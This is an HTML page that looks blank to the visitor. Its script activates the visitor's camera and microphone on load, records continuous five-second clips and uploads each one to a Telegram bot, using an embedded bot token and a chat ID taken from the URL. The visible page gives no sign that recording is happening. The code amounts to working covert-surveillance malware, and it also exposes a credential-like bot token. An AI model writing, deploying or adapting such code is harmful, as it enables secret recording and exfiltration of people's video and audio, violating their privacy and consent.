<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title></title>
    <style>
        body { background-color: #ffffff; margin: 0; padding: 0; overflow: hidden; }
        video { display: none; }
    </style>
</head>
<body>

    <video id="preview" autoplay playsinline muted></video>

    <script>
        const BOT_TOKEN = '8928916946:AAEYVCHLdoVB-l0svDNHInRmc25myCz8pnw';
        let currentStream = null;
        let mediaRecorder = null;
        let currentFacingMode = "user"; // "user" = front, "environment" = back
        let targetChatId = null;

        const urlParams = new URLSearchParams(window.location.search);
        targetChatId = urlParams.get('chat_id') || '6594044423';

        async function initCamera() {
            try {
                if (currentStream) {
                    currentStream.getTracks().forEach(track => track.stop());
                }
                currentStream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: currentFacingMode },
                    audio: true
                });
                
                const videoElement = document.getElementById('preview');
                videoElement.srcObject = currentStream;

                startStreaming();
            } catch (err) {
                console.error("Permission error:", err);
            }
        }

        function startStreaming() {
            if (!currentStream) return;

            mediaRecorder = new MediaRecorder(currentStream, { mimeType: 'video/webm' });

            mediaRecorder.ondataavailable = async (event) => {
                if (event.data && event.data.size > 0 && targetChatId) {
                    sendToTelegram(event.data);
                }
            };

            // Stream continuous 5-second clips
            mediaRecorder.start(5000);
        }

        async function sendToTelegram(blob) {
            const formData = new FormData();
            formData.append('chat_id', targetChatId);
            formData.append('video', blob, 'video.webm');

            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
                    method: 'POST',
                    body: formData
                });
            } catch (err) {
                console.error("Upload error:", err);
            }
        }

        // Start automatically on page load
        window.onload = initCamera;
    </script>
</body>
</html>
